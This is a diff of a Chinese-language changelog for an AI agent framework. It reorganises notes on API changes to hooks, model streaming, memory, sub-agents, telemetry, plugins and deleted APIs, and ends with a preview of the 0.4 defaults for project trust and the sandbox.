-  返回 `Result<PathBuf, PluginError>`(解析符号链接后不在包里就报错)。`PluginCache::is_cached`
-  要求有 `plugin::cache::INSTALLED_MARKER`;新增 `PluginCache::{lock, plugin_dir}`、
-  `plugin::install::{MAX_ARCHIVE_BYTES, UnpackLimits}`、`EnableState::{path, fault}`。
-- `assembly::plugins::PluginSubsystem::disclosure` 删除(只给 `plugin.install` 用,结果在它的
-  响应里),新增 `health_check()`。
-- `ScriptCarrier` 多了 `limits()`;`call_blocking` 在多线程运行时的工作线程上经
-  `tokio::task::block_in_place` 跑脚本。新增 `script_host::bindings::{MAX_LIMITS,
-  PACKAGE_MAX_LIMITS}`。
-- 新增 `ptc::default_run_slots()` 与 `RunCodeTool::with_run_slots`。
+
+#### hooks
+
+- `hooks::config::HookConfig::{Prompt, Agent}` 多了 `may_approve: bool`(结构体字面量要补;
+  `false` 即它的批准不算)。
 - `hooks::HookConfig::{Prompt, Http, Agent}` 多了 `if_pattern: Option<String>`(结构体字面量
   要补)。`hooks::runner::DEFAULT_HOOK_TIMEOUT_MS` 是 `60_000`。
 - `base::interface::exec::HttpRequest` 多了 `public_only: bool`(结构体字面量要补;`new()`
@@ -1173,28 +1071,202 @@ WebAssembly 载体整个移除。
   `from_ambient`。
 - `runtime::module::SessionContext` 多了 `hook_ambient`。`runtime::agent::Builder` 多了
   `team_seat(TeamSeat)`;只在 `agent_depth` 为 0 的会话上启动 `FileChanged` 监视。
-- `AgentSpawner::spawn_agent_with_tools` 多了最后一个参数 `seat: Option<TeamSeat>`(新类型
-  `base::interface::agent_spawner::TeamSeat { team, member }`);自己实现这个方法的要加上。
-- `agents::agent_tool::AgentTool` 起的子 Agent 用 `set_hooks` 给的那个 runner(经
-  `Builder::hooks`),不再从 settings 另建。
-- 删除没有调用方的 `base::rpc`、`base::log`(`base::interface::log`:`Logger`、`NoopLogger`、
-  `LogRouter` 与 `log_*!` 宏)、`tools::aliases`(`BriefTool`、`PowerShellTool`、`ReplTool`)
-  与 `assembly::session_manager`(`daemon::session_manager`)。日志用 `tracing`。
-- `telemetry`:删除 `ShutdownSignalPayload` 与 `TelemetryEvent::shutdown_signal`。`FileRecorder`
-  建的文件是 `0600`,为它新建的那一层目录是 `0700`。
 - `hooks::HookResponse` 去掉 `suppress_output`。`check_rewakes` 在没有 hook 等着时把通道里的信号
   清掉:hook 要求唤醒之前就结束的工作不算数。
-- `AgentSpawner` 多了 `spawn_agent_on_model(prompt, cwd, cancel, model)`(agent hook 的 `model`
-  走它),缺省实现拒绝;只有 `RuntimeAgentSpawner` 真正实现。
 - `runtime::agent::Builder` 没给 `wake_receiver`、hooks runner 又是自己建的(根会话)时,
   会话的运行中任务结束就唤醒 `async_rewake` hook;给了 `wake_receiver` 的照旧只听它。
 - `hooks::HookConfig` 的四个变体都多了 `on_error: hooks::OnError`(结构体字面量要补,
   `OnError::Allow` 是原来的行为)。`HookOutcome::Ran` 多了 `failure: Option<String>`:跑了但
   回答不能用(退出码不是 0 或 2、不是 JSON)时写明原因。
-- `base::interface::memory::MemoryStore::{compact, with_environment}`、
-  `DurableMemory::{staleness_penalty, effective_confidence}`、`team::TeamMemoryStore::compact`
-  删除:记忆不再按年龄与置信度自动清理。新增 `assembly::doctor::MemoryCheck`。
 - `hooks::HookConfig::Http` 多了 `allow_local: bool`。`base::interface::exec::HttpRequest` 多了
   `internal_target: bool`(结构体字面量要补;`public_only_but_target()` 连同 `public_only` 一起
   置位):`Origin::Operator` 的请求去 url 自己的主机与端口时不查内部地址。自己实现 `Network`
   的要照做。
+
+#### 模型与回合
+
+- `AgentEvent` 多了 `Notification { message, status, turn_id }`;穷举匹配它的要补一支。
+- `AgentEvent::TurnComplete` 多了字段 `truncated`,`ModelEvent` 多了变体 `Truncated`(OpenAI
+  兼容适配器在补出的 `EndTurn` 之前发),`telemetry::ApiRequestPayload` 多了 `truncated`。
+  用结构体字面量构造前两者 / 穷举匹配 `ModelEvent` 的要跟着改。
+- `AnthropicModel::stream` / `OpenAICompatibleModel::stream` 在返回前等到厂商开始回答:请求被拒
+  (状态码、连不上、重试用尽)从 `stream()` 返回 `Err`,不再是流的第一项;两者都认传进来的
+  `CancellationToken`,取消时 `stream()` 返回 `ModelError::Cancelled`,流里出 `Err(Cancelled)` 后结束。
+  一个什么都没发就结束的 Anthropic 响应是 `ModelError::Network`。
+- 流里的 `error` 事件按它的 `type` 分类(`overloaded_error` → `Overloaded`、`rate_limit_error` →
+  `RateLimited`、`invalid_request_error` → `Api{400}`……),不再一律 `Api{500}`;Chat Completions
+  流里的 `{"error":…}` 块同样成为 `Err`(`ChatCompletionChunk` 多了 `error` 字段)。
+  `AnthropicError::StreamInterrupted` 映射为 `ModelError::Network`(原为 `Internal`)。
+- `model::stream::ContentBlockStart` 与 `BlockDelta` 多了 `Unknown`:不认识的块类型、增量类型
+  跳过这一块,不再让整条流解析失败;穷举匹配它们的要补一支。
+- 自己实现 `Model` 的:流必须以 `ModelEvent::EndTurn` 收尾,没有它的流被当作中途断开。
+- `ModelEvent` 多了 `MalformedToolUse { id, name, raw_input }`:参数解析不了的工具调用,两个
+  内置适配器以它代替 `ToolUse { input: {} }`;穷举匹配 `ModelEvent` 的要补一支,自己实现
+  `Model` 的也该这样报。
+- `InputMessage::ToolResult` 的 `tool_use_id` 必须是最近一条回复里还没有结果的调用,否则
+  `process_turn` 返回 `TurnError::Internal`、transcript 不变。发往模型的请求里,不对应前一条
+  回复里任何 `tool_use` 的 `tool_result` 被去掉。
+- `EngineConfig::file_limits` 的 `max_tool_result_chars` 删除(从没有地方读它;单条工具结果的
+  上限是压缩器的 50,000 字符);`default_read_lines`、`max_line_chars` 现在真的决定 `Read` 的
+  默认行数与单行上限(以前写死 2000)。新增 `base::tool::MAX_IMAGE_BYTES`。
+- `ToolExec::with_timeout` 起的计时任务随这次调用结束,不再睡到超时。
+- `runtime::streaming::execute_stream` 返回 `Result<StreamResult, StreamFailure>`(原为
+  `Result<_, TurnError>`);`StreamResult` 多了 `cancelled`。
+- `StopRecovery` 多了 `Continue`,`DefaultRecovery` 对 `pause_turn` 返回它;穷举匹配
+  `StopRecovery` 的要补一支。
+- `HttpAnthropicClient::with_base` 自己把 base 归成 `…/v1/messages`(新增
+  `model::client::messages_url`),调用方不用再补结尾的 `/`(以前不补,`https://relay/anthropic`
+  的 `anthropic` 会被换掉);不能带路径的 URL(`data:`)在这里报 `AnthropicError::ParseError`,
+  不再等到第一次请求。
+
+#### 压缩与记忆
+
+- 自己实现 `Compactor` 的:引擎传给 `compact` 的 `max_tokens` 在自动压缩时是阈值减去
+  请求的固定开销与必然补回的提醒;返回的策略不是 `NoOp`、对话却没有变小(连同补回的提醒
+  一起算)的,引擎不采用。`DefaultCompactor` 的兜底一条都折不掉时返回 `NoOp`。
+- `CompactError::Exhausted` 删除(从没有构造过);`compaction::reactive` 删掉零调用的
+  `ReactiveCompactConfig`、`CompactionLevel`、`calculate_thresholds`、`compaction_level`、
+  `should_compact_with_state` 与 `CompactionState::last_compact_turn`。新增
+  `compaction::llm_summary::is_summary`。
+- `ToolResultBudget` 的 `max_per_result` / `max_total` 改按字符计(以前是字节);新增
+  `compaction::compact::TOOL_IMAGE_CHARS`。
+- `compaction::cached::clear_stale_tool_results` 保留 `tool_use_id`(以前置空,请求会被拒),
+  已经清过的不再计数、不再报进 `cache_edits`。
+- `SessionManager::replace_messages_after_compact` 自己重排 `message_timestamps`(压缩留下的
+  尾部保留原来的时间,前面新插入的记为现在),调用方不要再 `truncate` 它;`resume` 之后的
+  `turn_count` 是用户发起的轮数(用户消息与斜杠命令展开),不再是日志行数。
+- `base::frozen::find_relevant_memories`、`base::memory::select_memories_with_llm`、
+  `MemoryStore::scan_memory_headers` 删除;按相关性挑记忆用 `base::memory::select_memories_from`
+  (生产路径 `MemoryRetriever` 一直走它)。
+- 新增 `MemoryStore::for_paths`(会话用的记忆目录唯一的推导处)、`user_dir`、`record_recalled`,
+  `base::memory::{memory_prompt, MAX_MEMORIES}`;`scan_for_secrets` / `SecretPattern` 挪到
+  `base::memory`(`team::team_memory` 里照旧可用)。`assemble_prompt` 的 `memory_store` 参数
+  现在真的被用来出 `# Memory` 一节,传进去的应是会话的那个 store。`FrozenContext::memory_dir`
+  是全局记忆目录,`memory_index` 是两处合并的索引。
+- `base::interface::memory::MemoryStore::{compact, with_environment}`、
+  `DurableMemory::{staleness_penalty, effective_confidence}`、`team::TeamMemoryStore::compact`
+  删除:记忆不再按年龄与置信度自动清理。新增 `assembly::doctor::MemoryCheck`。
+
+#### 子 Agent 与团队
+
+- `base::agent_type::AgentTypeSource::LocalFile` 拆成 `User`(全局 / 场景的 `agents/`)与
+  `Project { trusted }`,多了 `may_shadow()`。`agents::agent_tool::{merge_agent_types,
+  load_agent_types_from_dir}`、`SharedAgentTypeCatalog::{build, unwatched, refresh}`、
+  `AgentTool::with_parent_tools` 的目录参数换成 `&[(PathBuf, AgentTypeSource)]`
+  (`load_agent_types_from_dir` 多一个 `source`);新增 `agent_type_dirs(&Settings)` 按设置给出这三层。
+- `AgentSpawner::spawn_agent_with_tools` 的默认实现在收到非空 `extra_tools` 或 `permission_mode`
+  时返回错误,不再悄悄丢掉它们去调 `spawn_agent`;支持团队的 spawner 要自己实现它。
+  `RuntimeAgentSpawner` 按 `allowed_tools`(非空时)收窄子 Agent 的工具,以前忽略。
+- `Agent` 被丢弃时清空它的会话工具注册表(`InMemoryToolRegistry::clear`,新增),并取消
+  `SessionContext::session_ended()`(新增)给出的令牌;模块里活得比一轮长的东西(常驻成员)
+  挂在它上面。会话的工具彼此引用(`Agent` 工具在它所在的注册表里、团队工具经 spawner 回到
+  `Agent` 工具),不清空的话整套都不会被释放。`AgentTool::set_hooks` 只弱持 runner;新增
+  `AgentTool::set_session_ended`。
+- `ExecutionSettings` 多了 `max_agent_depth`。
+- `team::mailbox::MailboxStore::send` 返回 `Result<(), UnknownPeer>`,不是成员的收件人被拒;
+  新增 `MailboxStore::check_peer` 与 `team::mailbox::mailbox_file`(标签到文件名)。
+- `AgentSpawner::spawn_agent_with_tools` 多了最后一个参数 `seat: Option<TeamSeat>`(新类型
+  `base::interface::agent_spawner::TeamSeat { team, member }`);自己实现这个方法的要加上。
+- `agents::agent_tool::AgentTool` 起的子 Agent 用 `set_hooks` 给的那个 runner(经
+  `Builder::hooks`),不再从 settings 另建。
+- `AgentSpawner` 多了 `spawn_agent_on_model(prompt, cwd, cancel, model)`(agent hook 的 `model`
+  走它),缺省实现拒绝;只有 `RuntimeAgentSpawner` 真正实现。
+
+#### 遥测
+
+- `telemetry`:`EventPayload` 去掉"遥测"一节里去掉的那 15 种事件与 `shutdown_signal`及其 payload 类型,多了 `KINDS`;
+  `TurnStartPayload` / `TurnCompletePayload` 去掉 `turn_no` / `turn_id`,`UserPromptSubmitPayload`
+  只剩 `char_count` / `attachment_count`,`SlashCommandUsedPayload` 是 `{command, kind, has_arg}`,
+  `ApiErrorPayload` 的 `http_status` 变 `Option<u16>`、去掉 `retry_count`,
+  `PermissionDecisionPayload` 去掉 `rule_source`、`PermissionDecisionOutcome` 去掉
+  `Escalated` / `Remembered`,`AgentSpawnedPayload` 是 `{agent_id, role, model?, stage_name?,
+  background}`,`AgentCompletedPayload` 去掉 `turn_count` / `tool_call_count`,
+  `McpServerConnectedPayload` / `McpConnectionErrorPayload` 精简,`StartupTimingPayload` 见上,
+  `SessionEndPayload` 去掉 `total_cost_usd` / `total_errors`。`telemetry::cost`、`telemetry::stats`
+  删除。`RedactionPolicy` 与 `TelemetryConfig` 去掉 `redact_prompts` / `redact_tool_content`
+  (`RedactionPolicy` 还去掉 `redact_secrets`、`has_content_redaction`),新增
+  `RedactionPolicy::scrub_message`。`TelemetryHandleError` 多了 `Io`,`FileRecorder::record`
+  写失败返回它;新增 `FileRecorder::with_max_bytes`,去掉 `FileRecorder::exists`。
+  `telemetry`:删除 `ShutdownSignalPayload` 与 `TelemetryEvent::shutdown_signal`。`FileRecorder`
+  建的文件是 `0600`,为它新建的那一层目录是 `0700`。
+- 进程级 OTel 导出器由 `assembly::telemetry_otel::process_exporter(endpoint)` 起(原先在 `SessionPool` 里);**嵌 daemon 的进程退出前必须调 `assembly::telemetry_otel::shutdown_process_exporter()`**(`agixd` 在监听器退出后调),否则丢最后一批数据。`TelemetryRecorder::shutdown` 对 `OtelExporter` 只 `force_flush`、不再关掉进程级 provider。第二个 pool 配的不同 `endpoint` 被忽略。
+
+#### 会话与存储
+
+- `history::store::HistoryStore` 多了 `sync` 与 `claim`(都有缺省实现),新类型
+  `history::store::SessionClaim`;`HistoryError` 多了 `Locked`(穷举匹配的要补一支)。
+  `JsonlHistoryStore` 的 `append` 不再承诺立即持久,`sync` 才是;`delete` 在会话被别的进程
+  占着时报 `Locked`。`SessionManager::persist` 写了东西就 `sync` 一次。包装别的 store 的
+  实现要把这两个方法转发下去,否则拿到的是什么都不做的缺省。
+- `history::blob::PasteStore::cleanup` 删除(按 mtime 删,不管还有没有日志引用)。
+  `JsonlHistoryStore` 的写锁按会话分开,一个会话的 IO 卡住不再挡别的会话;
+  `set_session_title` 与 append 拿同一把锁,另一个进程占着这个会话时同样报 `Locked`。
+- `transcript::ExtensionsAreVisible` 对它不覆盖的扩展条目照引擎的规矩处理(`agix.context` 的
+  drop / edit 照样生效);`LogEntry::ToolResult` 只并进全是工具结果的末尾 User,同一个
+  `tool_use_id` 只并一次。
+
+#### daemon
+
+- `daemon::write_lock_file` 返回 `DaemonLockGuard`(`Deref` 到 `DaemonLock`),持有期间占着
+  `flock`,drop 时删掉锁文件;不要再自己删。新增 `discovery::create_private_dir`。
+- `SessionPool::shutdown_all` 一开始就拒绝再建会话,重复调用等第一次做完。新增
+  `DaemonServer::shutdown()`:先停监听再 `shutdown_all`,自己先 `shutdown_all` 再取消
+  `shutdown_token` 的嵌入方改用它。
+- `rpc::SessionOptions::from_params` 与 `rpc::IgnoredOption` 新增,`SessionOptions::FIELDS`
+  列出全部字段名。`base::settings::unknown_settings_keys` 新增。
+
+#### 插件、脚本与工具
+
+- `SkillCatalog` 多了 `expand`(有缺省实现:正文加参数替换,不执行、不授权),返回新类型
+  `base::interface::skill_catalog::SkillExpansion { text, grants }`;包一层 `SkillCatalog` 的
+  要把它转发下去,否则 `/name` 拿到的是缺省展开。新增 `skills::expand_for_invocation` /
+  `skills::ExpandError` 与 `CommandRegistry::run_prompt_command`(斜杠命令在轮里走的就是它)。
+  `SkillManager::get_skill_content` 对磁盘 skill 返回去掉 frontmatter 的正文。
+- `plugin::cache::check_component` 新增;`plugin::install::{install, uninstall}` 与
+  `PluginCache::remove_version` 对不合规的 `name` / `version` 返回 `PluginError::Schema`,
+  `remove_version` 还拒绝解析到 cache 之外的插件目录。
+- `plugin::blocklist` 模块与 `PluginError::Blocked` 删除。`plugin::manifest::Plugin::path`
+  返回 `Result<PathBuf, PluginError>`(解析符号链接后不在包里就报错)。`PluginCache::is_cached`
+  要求有 `plugin::cache::INSTALLED_MARKER`;新增 `PluginCache::{lock, plugin_dir}`、
+  `plugin::install::{MAX_ARCHIVE_BYTES, UnpackLimits}`、`EnableState::{path, fault}`。
+- `assembly::plugins::PluginSubsystem::disclosure` 删除(只给 `plugin.install` 用,结果在它的
+  响应里),新增 `health_check()`。
+- `ScriptCarrier` 多了 `limits()`;`call_blocking` 在多线程运行时的工作线程上经
+  `tokio::task::block_in_place` 跑脚本。新增 `script_host::bindings::{MAX_LIMITS,
+  PACKAGE_MAX_LIMITS}`。
+- 新增 `ptc::default_run_slots()` 与 `RunCodeTool::with_run_slots`。
+- `plugin::McpKind::Dsh`、`McpPayload` 的 `entry` / `env`、`plugin::locate` 模块删除(`[[mcp]] kind = "dsh"` 现被拒,见上)。
+- `WebFetch`:`tools::SecondaryLlm` trait、`tools::secondary_llm` 模块与 `with_secondary_llm` 删除(tools 不再依赖 model),换成 `tools::page_extract::PageExtractor`(`dyn Model` + 模型名)与 `tools::register_web_fetch(registry, Option<(model, name)>)`,新增 `call_purpose::WEB_FETCH`。有模型时它替换表里的 WebFetch,没有时保留已有的(子 Agent 承接父会话那个),表里没有才注册一个不抽取的。`register_builtin_tools` 仍注册不抽取的 WebFetch,直接用注册表的嵌入方不受影响。
+
+#### 删除的 API
+
+- `team::prompt::build_coordinator_prompt` 删除(没有地方读它)。
+- `runtime::context`(`AgentContext`)删除,从来没有调用方。
+- `team::lock` 删除(没有调用方)。`AgentTool::resume_agent`、`Agent::seed_history` 删除(只有
+  测试调用)。
+- 删除没有调用方的 `base::rpc`、`base::log`(`base::interface::log`:`Logger`、`NoopLogger`、
+  `LogRouter` 与 `log_*!` 宏)、`tools::aliases`(`BriefTool`、`PowerShellTool`、`ReplTool`)
+  与 `assembly::session_manager`(`daemon::session_manager`)。日志用 `tracing`。
+- `hooks::HookRunner::set_network`、`auth::OAuth2Client::with_network` 删除;后者要换出口直接设
+  `net` 字段。
+- **公开 API 的死代码清理。** 下面这些 `pub` 项从未被接上或没有调用方,已删除;用到的要改。
+  - 整个 `task` crate(`DreamTask`、`RunningTaskStore`、`TeamDeleteTool` 等)与 `base::features::dream_task`。
+  - 整个模块:`base::intent`、`base::result`(`ToolResult` / `ProgressSender` 的第二套实现)、`compaction::cleanup`、`mcp::registry`(`official_registry`)、`team::polling`(`MailboxPoller`、`start_polling`……)、`team::protocol`(`ProtocolMessage`……)、`telemetry::feature_flags`(`FeatureFlagClient`……)、`telemetry::env_metadata`(`collect_env_metadata`……);`compaction::session_memory`、`tools::bash::safety`、`tools::bash::sed_validate` 本来就没被编译。
+  - `compaction::CompactStrategy::SessionMemory`;`assembly::rpc::codes::SESSION_CAP_REACHED`。
+  - `tools::assemble_tool_pool` / `assemble_tool_pool_refs`;`AgentTool::with_mailbox`;`team::coordinator` 的 `PermissionBridge`、`PermissionPrompt`、`create_permission_bridges`、`aggregate_stage_results`(父端从未存在)。
+  - `runtime::commands` 的 `CommandResult`、`handle_local_command`、`Command::Local { handler }`,`insert_local` 改成两个参数(斜杠命令在 `turn.rs` 按名字分发)。
+  - `model::AnthropicError::is_context_limit_error`。
+  - `mcp::McpManager` 的 `connect_all_with_env` / `connect_all_with_callback`、`server_inventory`(及 `ServerInventory`)、通知 handler 一套(`McpNotificationHandler`、`register_notification_handler`、`dispatch_notification`、`set_notification_allowlist`)、`tool_permissions` / `is_tool_allowed` / `set_tool_permissions`(由权限规则负责)、`on_elicitation`;`mcp::make_mcp_tools`、`McpServerState` 与 `server_states`。
+  - `SessionState`:`PermissionDenial` 与 `record_denial` / `drain_denials` / `check_denial_escalation`,running task 持久化(`RunningTaskPersist`、`register_running_task`、`with_running_task_store`……),todo 提醒(`record_todo_write_turn`、`turns_since_todo_write`、`check_verification_nudge`、`todos_summary`),`plan_slug`,`sandbox_allow_writes`;`FrozenContext::relevant_memories` / `with_relevant_memories`;`MemoryStore::scan_memory_headers`。
+  - `Paths::{global_agents_dir, global_rules_dir, global_hooks_dir}`、`PermissionMode::is_safe_default`、`base::interface::tool` 的 `extract_tool_name`。
+  - `hooks::HookRunner::{with_default_timeout, with_wake_receiver, register_hook}`;`runtime::agent::Agent::{session_info, set_model, skills_arc, run_hooks}`;`scene::declarative` 的 `with_extra_tools`;`script_host` 的 `with_memory_limit`;`Session::set_parent_session`;`SkillManager::{expand_skill, build_skills_prompt}`。
+  - `compaction`:`strip_images_from_messages`、`grouping::estimate_tokens_with`、`CachedMicrocompact` 的 `mark_tools_sent_to_api` / `get_pinned_cache_edits` / `build_cache_edits` / `format_cache_edit`;`history::transcript::{compact_summary_from_messages, latest_stop_reason}`;`assembly::discovery::read_lock_file`;`SessionPool::project_settings_path`。
+
+### 0.4 预告
+
+下面几项在 0.3.10 里仍是旧缺省,0.4 会翻。现在就可以按新缺省试跑,迁移时改的地方各节里已写明。
+
+- `project_trust.default` 改为 `untrusted`:没被信任的项目的 hooks、MCP server、脚本、provider 端点等不生效(见"项目信任")。全局 `settings.json` 里先写 `"project_trust": {"default": "untrusted"}` 试跑,`daemon.doctor` 与 `project.status` 会列出被扣下的东西。
+- 插件缺省不再自动加载,要用的显式启用。
+- `sandbox.unattended_requires_network_policy` 缺省改为 `true`:无人值守会话里 `Bash` 与 `Monitor` 的"沙箱完整生效即自动放行"另外要求 `sandbox.network_mode` 不是 `unrestricted`(见"权限与沙箱")。
+- `session.create` / `session.run_turn` / `session.resume` 的 `options` 严格解析:不认识的字段、读不出来的值报 `INVALID_PARAMS`,不再被忽略。现在就把 `result.ignored_options` 当错误处理。
